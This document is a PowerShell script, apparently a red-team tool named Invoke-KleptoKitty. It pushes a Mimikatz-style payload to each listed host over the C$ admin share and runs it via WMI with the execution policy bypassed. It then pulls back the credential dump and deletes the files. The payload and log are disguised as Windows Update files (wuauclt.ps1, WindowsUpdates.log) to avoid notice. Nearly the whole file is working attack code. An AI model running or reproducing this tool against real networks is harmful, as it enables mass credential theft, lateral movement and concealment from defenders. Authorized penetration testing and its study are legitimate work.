<#
    Invoke-KleptoKitty - Deploys Mimikatz and collects credentials
    
    Author: Michael Schneider, scip AG
    License: MIT
    Copyright: 2019 Michael Schneider, scip AG
    Required Dependencies: None
    Optional Dependencies: None
#>

[CmdletBinding()]
Param (
    [Parameter(Mandatory=$true)]
    [ValidateScript({Test-Path $_})]
    [String]
    $HostsFile,

    [ValidateSet("WMI","PsExec","PSRemoting")]
    [String]
    $RemoteCommandExecution = "WMI"
)

<#
    to do:
    - DumpMethod = Mimikatz, Sqldumper.exe, ProcDump.exe
    - DeleveryMethod = Copy, RemoteHttp, RemoteShare
    - Config-File für Hosts, Payloadname, Token
#>

$AdminCredential = Get-Credential
$AdminUsername = $AdminCredential.UserName
$AdminPassword = $AdminCredential.GetNetworkCredential().password

$Hosts = Get-Content $HostsFile
$BasePath = "C:\tmp"
$Timestamp = (Get-Date).ToString("yyyyMd")

$PayloadName = "Payload.ps1" # Payload like Invoke-Mimikatz.ps1
$PayloadPath = "$BasePath\$PayloadName"
$PayloadKey = "YourSecretKeyHere" # Use if the payload is encrypted
$ProtocolName = "protocol_kleptokitty-$Timestamp.txt"
$ProtocolPath = "$BasePath\$ProtocolName"


Function Write-ProtocolEntry($Text, $LogLevel) {

    $Time = Get-Date -Format G

    Switch ($LogLevel) {
        "Info" { $Message = "[*] $Time - $Text"; Write-Host $Message; Break}
        "Debug" { $Message = "[-] $Time - $Text"; Write-Host -ForegroundColor Cyan $Message; Break}
        "Warning" { $Message = "[?] $Time - $Text"; Write-Host -ForegroundColor Yellow $Message; Break}
        "Error" { $Message = "[!] $Time - $Text"; Write-Host -ForegroundColor Red $Message; Break}
        "Success" { $Message = "[$] $Time - $Text"; Write-Host -ForegroundColor Green $Message; Break}
        Default { $Message = "[*] $Time - $Text"; Write-Host $Message; }
    }    
    Add-Content -Path $ProtocolPath -Value $Message
}

#
# Push it. Dump it. Get it. Remove it. - by Tinker
#
Function Main {

    Write-Output "`n"
    Write-Output "      =^._.^="
    Write-Output "     _(      )/  KleptoKitty"
    Write-Output "`n"
    Write-ProtocolEntry "Starting KleptoKitty" "Info"

    Foreach ($Hostname in $Hosts) {

        # Get 2 random letters
        $PSDriveName = -join ((65..90) | Get-Random -Count 2 | % {[char]$_})

        $LogTargetName = "mimikatz_$Hostname.log"
        $LogTargetPath = "$basePath\$LogTargetName"

        $TargetShare = "\\$Hostname\c$"
        $TargetBasePath = "tmp"
        $TargetPayloadName = "wuauclt.ps1"
        $TargetPayloadPath = "$TargetShare\$TargetBasePath\$TargetPayloadName"
        $TargetPayloadLocalPath = "C:\$TargetBasePath\$TargetPayloadName"
        $TargetLogName = "WindowsUpdates.log"
        $TargetLogPath = "$TargetShare\$TargetBasePath\$TargetLogName"

        Write-ProtocolEntry "Connecting to $Hostname and uploading payload" "Info"    
    
        try {
            New-PSDrive -Name $PSDriveName -PSProvider FileSystem -Root $TargetShare -Credential $AdminCredential -ErrorAction Stop | Out-Null
            Copy-Item -Path $PayloadPath -Destination $TargetPayloadPath -ErrorAction Stop
        } catch {
            $ErrorReason = $_.Exception.Message
            Write-ProtocolEntry "Connection to $Hostname failed. Reason: $ErrorReason" "Error"
            Write-ProtocolEntry "$Hostname done" "Error"
            Continue
        }

        Write-ProtocolEntry "Dumping memory on $Hostname" "Info"
        
        If ($RemoteCommandExecution -eq "WMI") {

            try {
                # wmic /NODE:$Hostname /USER:$AdminUsername /PASSWORD:$AdminPassword PROCESS CALL CREATE "powershell.exe -Exec Bypass -Enc $TargetPayloadCommandEncoded" > $null
                $TargetPayloadCommand = "$TargetPayloadLocalPath -Token $PayloadKey"
                $WmiExec = Invoke-WmiMethod -Class "win32_process" -Name "create" -ArgumentList "powershell.exe -Exec Bypass $TargetPayloadCommand" -ComputerName $Hostname -Credential $AdminCredential -ErrorAction Stop           
            } catch {
                $ErrorReason = $_.Exception.Message
                Write-ProtocolEntry "WMI connection to $Hostname failed. Reason: $ErrorReason" "Error"
                Write-ProtocolEntry "$Hostname done" "Error"
                Continue
            }
        } ElseIf ($RemoteCommandExecution -eq "PsExec") {
            try {
                #psexec .\PsExec64.exe -accepteula -nobanner -h \\192.168.242.133 -u admin hostname
            } catch {
                $ErrorReason = $_.Exception.Message
                Write-ProtocolEntry "PsExec connection to $Hostname failed. Reason: $ErrorReason" "Error"
                Write-ProtocolEntry "$Hostname done" "Error"
                Continue                    
            }
        } ElseIf ($RemoteCommandExecution -eq "PSRemoting") {
            try {
                # $Session = New-PSSession -ComputerName $ComputerName -credential $Cred
                # $Job = Invoke-Command -Session $Session -Scriptblock $Script
                # Remove-PSSession -Session $Session
            } catch {
                $ErrorReason = $_.Exception.Message
                Write-ProtocolEntry "PSRemoting connection to $Hostname failed. Reason: $ErrorReason" "Error"
                Write-ProtocolEntry "$Hostname done" "Error"
                Continue                    
            }
        }

        $SleepTime = 60
        Write-ProtocolEntry "Let Mimikatz finish. Waiting for $SleepTime seconds!" "Debug"        
        Start-Sleep -Seconds $SleepTime    
        
        Write-ProtocolEntry "Retrieving log file" "Info"
        $Error.Clear()
        try {
            Copy-Item -Path $TargetLogPath -Destination $LogTargetPath -ErrorAction Stop 
        } catch {
            $ErrorReason = $_.Exception.Message
            Write-ProtocolEntry "Retrieving log file failed. Reason: $ErrorReason" "Error"            
        }
        if ($Error.Count -eq 0) {
            Write-ProtocolEntry "Log file $LogTargetName saved." "Success"
        }

        Write-ProtocolEntry "Cleaning up" "Info"
        try {
            Remove-Item -Path $TargetLogPath -Force -ErrorAction Stop
            Remove-Item -Path $TargetPayloadPath -Force -ErrorAction Stop
            Remove-PSDrive -Name $PSDriveName -Force -ErrorAction Stop
        } catch {
            $ErrorReason = $_.Exception.Message
            Write-ProtocolEntry "Clean up failed. Reason: $ErrorReason" "Error"    
        }

        Write-ProtocolEntry "$Hostname done" "Info" 
    }
    Write-ProtocolEntry "KleptoKitty is done" "Info"
    Write-Output "`n"
}

Main
